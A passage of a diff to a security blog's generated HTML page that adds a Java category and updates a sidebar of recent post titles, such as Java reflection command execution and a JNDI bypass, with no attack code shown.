-    print i<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-	
-	</div>
-  <a type="button" href="/2018/06/13/powershell-pen.html#more" class="btn btn-default more">Read More</a>
-</div>
-
-		
 
 		</div>
 
@@ -726,6 +718,8 @@ for i in gzip.GzipFile(fileobj&#x3D;res):
 		
 			<li><a href="/categories/Fun/">Fun<span>3</span></a></li>
 		
+			<li><a href="/categories/Java/">Java<span>3</span></a></li>
+		
 			<li><a href="/categories/Learning/">Learning<span>16</span></a></li>
 		
 			<li><a href="/categories/PWN/">PWN<span>2</span></a></li>
@@ -751,23 +745,23 @@ for i in gzip.GzipFile(fileobj&#x3D;res):
   <ul class="entry list-unstyled">
     
       <li>
+        <a href="/2022/03/30/Load_Class_In_Multi_JavaVersion.html" ><i class="fa fa-file-o"></i>低版本Java运行高版的Class</a>
+      </li>
+    
+      <li>
+        <a href="/2022/03/22/java-reflection-shell.html" ><i class="fa fa-file-o"></i>Java安全笔记(2)-反射执行系统命令</a>
+      </li>
+    
+      <li>
+        <a href="/2022/03/22/java-reflection.html" ><i class="fa fa-file-o"></i>Java安全笔记(1)-反射机制</a>
+      </li>
+    
+      <li>
         <a href="/2022/03/21/jndi-exec-by-mvel.html" ><i class="fa fa-file-o"></i>JNDI Bypass - MVEL</a>
       </li>
     
       <li>
         <a href="/2022/03/18/from-spring-boot-to-getshell.html" ><i class="fa fa-file-o"></i>从Spring Boot H2 Database到Ge...</a>
-      </li>
-    
-      <li>
-        <a href="/2021/08/06/windows-ntlm-smb-scan.html" ><i class="fa fa-file-o"></i>NTLM端口信息探测</a>
-      </li>
-    
-      <li>
-        <a href="/2021/08/02/siem-on-elk.html" ><i class="fa fa-file-o"></i>SIEM On ELK</a>
-      </li>
-    
-      <li>
-        <a href="/2021/07/29/silverFish.html" ><i class="fa fa-file-o"></i>Silver调查报告</a>
       </li>
     
   </ul>
